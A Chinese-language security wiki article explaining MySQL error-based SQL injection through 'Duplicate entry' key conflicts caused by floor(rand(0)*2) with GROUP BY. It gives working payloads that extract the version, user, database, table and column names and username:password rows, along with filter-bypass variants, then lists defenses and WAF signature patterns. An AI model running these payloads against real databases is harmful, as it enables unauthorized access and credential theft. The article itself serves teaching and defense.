---
title: MySQL Duplicate Entry 报错注入原理与实战
description: 系统梳理 MySQL 基于 Duplicate Entry 报错的注入原理，详解 floor(rand(0)*2) 与 GROUP BY
  交互导致虚拟表主键冲突的机制，并给出版本、用户名、库名、表名等实战提取示例。
category: program-analysis
tags:
- MySQL
- SQL注入
- 报错注入
- Error-based SQLi
- Duplicate Entry
- floor(rand(0)*2)
- GROUP BY
- Web安全
date: 2021-11-16
updated: '2026-11-14'
---

## 现象概述

利用 MySQL 的 `Duplicate entry` 主键冲突报错，将查询结果（版本、用户名、库名、表名等）作为主键值抛出，从而在无回显场景下提取数据。典型报错信息如下：

```text
Duplicate entry '5.7.31-root@localhost-1' for key 'group_key'
```

> **核心思想**：构造 `SELECT ... GROUP BY` 语句，使虚拟表在插入第三行时因 `floor(rand(0)*2)` 重复计算导致主键冲突，报错信息中包含攻击者想要的数据。

---

## 核心函数解析

| 函数 | 作用 | 关键特性 |
|------|------|----------|
| `concat(str1,str2,...)` | 字符串拼接 | 任一参数为 `NULL` 则返回 `NULL` |
| `floor(n)` | 向下取整 | 返回不大于 `n` 的最大整数 |
| `rand([seed])` | 伪随机数生成 | **固定种子 `rand(0)` 产生固定序列**：`0.155..., 0.624..., 0.812..., 0.198..., 0.204...` |
| `floor(rand(0)*2)` | 生成 0/1 序列 | 固定序列为 **0,1,1,0,1,1...** |

> **关键结论**：`rand(0)` 固定种子使随机序列可预测，配合 `floor(*2)` 产生确定性的 0/1 模式。

---

## GROUP BY 虚拟表机制与冲突成因

### 执行流程模拟

以表 `testb`（至少 3 行数据）为例：

```sql
SELECT floor(rand(0)*2) AS a, COUNT(*) FROM testb GROUP BY a;
```

| 步骤 | 读取行 | 计算 `floor(rand(0)*2)` | 虚拟表操作 | 虚拟表状态 (key, count) | 备注 |
|------|--------|-------------------------|------------|-------------------------|------|
| 1 | 第1行 | **0** (第1次) | key=0 不存在 → 插入，**重新计算得 1** (第2次) | (1,1) | 插入时再次计算 |
| 2 | 第2行 | **1** (第3次) | key=1 存在 → **不重新计算**，count+1 | (1,2) | 命中已有 key |
| 3 | 第3行 | **0** (第4次) | key=0 不存在 → 插入，**重新计算得 1** (第5次) | **冲突！** | 插入时算出的 key=1 已存在 |

### 冲突必要条件

1. **数据行数 ≥ 3**（前两行构建虚拟表，第三行触发冲突）
2. **使用固定种子 `rand(0)`**（保证序列为 0,1,1,0,1,1...）
3. **`GROUP BY` 字段包含 `floor(rand(0)*2)`**（触发虚拟表主键逻辑）

> 若使用 `rand()` 无种子，序列不可控，可能不触发冲突；前几行若未冲突，后续也不会冲突。

---

## 实战提取示例

### 获取数据库版本与当前用户

```sql
SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2), USER()) AS a 
FROM users GROUP BY a;
```

**报错输出**：`Duplicate entry '5.7.31-root@localhost-1' for key 'group_key'`

### 枚举所有数据库名

```sql
SELECT COUNT(*), CONCAT(
  (SELECT schema_name FROM information_schema.schemata LIMIT 0,1),
  FLOOR(RAND(0)*2)
) AS x_col 
FROM information_schema.tables GROUP BY x_col;
```

**报错输出**：`Duplicate entry 'information_schema-1' for key 'group_key'`

> 修改 `LIMIT 0,1` → `LIMIT 1,1`、`LIMIT 2,1` 依次获取所有库名。

### 获取当前数据库表名

```sql
SELECT COUNT(*), CONCAT(
  (SELECT table_name FROM information_schema.tables 
   WHERE table_schema=DATABASE() LIMIT 0,1),
  FLOOR(RAND(0)*2)
) AS x_col 
FROM information_schema.tables GROUP BY x_col;
```

**报错输出**：`Duplicate entry 'users-1' for key 'group_key'`

### 获取指定表列名

```sql
SELECT COUNT(*), CONCAT(
  (SELECT column_name FROM information_schema.columns 
   WHERE table_name='users' LIMIT 0,1),
  FLOOR(RAND(0)*2)
) AS x_col 
FROM information_schema.tables GROUP BY x_col;
```

### 提取数据行内容

```sql
SELECT COUNT(*), CONCAT(
  (SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),
  FLOOR(RAND(0)*2)
) AS x_col 
FROM information_schema.tables GROUP BY x_col;
```

---

## 变体与绕过技巧

| 场景 | 替代方案 |
|------|----------|
| `rand(0)` 被过滤 | 使用 `rand(1)`、`rand(2)` 等任意固定整数种子 |
| `floor` 被过滤 | 使用 `ceil(rand(0)*2)`、`round(rand(0))` 等同向取整函数 |
| `group by` 被过滤 | 利用 `DISTINCT`、`ORDER BY` 触发临时表（需具体版本测试） |
| 需更长数据 | 用 `SUBSTR()` 分段提取，或配合 `EXP()`、`NAME_CONST()` 等其他报错函数 |

> **注意**：MySQL 5.7.5+ 默认开启 `ONLY_FULL_GROUP_BY`，可能导致非聚合列报错；实战中需结合具体 SQL 模式调整 payload。

---

## 防御与检测建议

1. **参数化查询 / 预编译语句** —— 根治 SQL 注入，参见 [[java-preparedstatement-sql-injection-defense]]。
2. **最小权限数据库账号** —— 禁止应用账号访问 `information_schema` 等系统库。
3. **错误信息脱敏** —— 生产环境关闭详细错误回显，统一返回通用错误页面。
4. **WAF / RASP 规则** —— 拦截含 `floor(rand(0)*2)`、`group by`、`concat(` 等特征组合的请求。
5. **自动化扫描集成** —— 在 CI/CD 中接入 [[sqlmap-api-automation]] 进行批量回归测试。

---

## 相关知识页面

- [[java-preparedstatement-sql-injection-defense]] —— Java 预编译机制防御 SQL 注入原理
- [[sqlmap-api-automation]] —— SQLMap REST API 自动化批量扫描实现
- [[cybersecurity-interview-guide-2022]] —— 网络安全面试题库中 SQL 注入专项索引

---

## 参考资料

- 原文：微信公众号「无名安全团队」—— *SQL注入-Duplicate entry注入报错及原理*
- MySQL 官方文档：`GROUP BY` 隐式分组、`RAND()` 确定性种子行为
- 《Web 安全之 SQL 注入攻击与防御》相关章节

## 来源

- [0x00实验室-202108-202304_045](../sources/0x00实验室-202108-202304_045.md)
